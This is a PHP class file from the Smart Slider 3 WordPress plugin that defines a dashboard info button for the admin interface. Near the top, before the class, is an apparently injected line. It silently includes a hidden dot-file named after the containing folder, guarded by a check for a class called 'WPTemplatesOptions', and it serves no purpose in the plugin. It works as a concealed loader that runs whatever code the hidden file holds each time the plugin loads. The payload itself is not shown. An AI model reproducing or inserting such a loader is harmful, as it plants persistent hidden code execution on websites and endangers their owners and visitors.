<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Forms\Button;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockButtonDashboardInfo extends BlockButtonPlainIcon {

    protected $baseClass = 'n2_button_plain_icon';

    protected $icon = 'ssi_24 ssi_24--notification';

    protected $size = 'big';

    protected function init() {
        parent::init();

        $this->setTabIndex(-1);
    }

    protected function getContent() {

        return '<i class="' . $this->icon . '"></i><div class="n2_dashboard_info__marker"></div>';
    }
}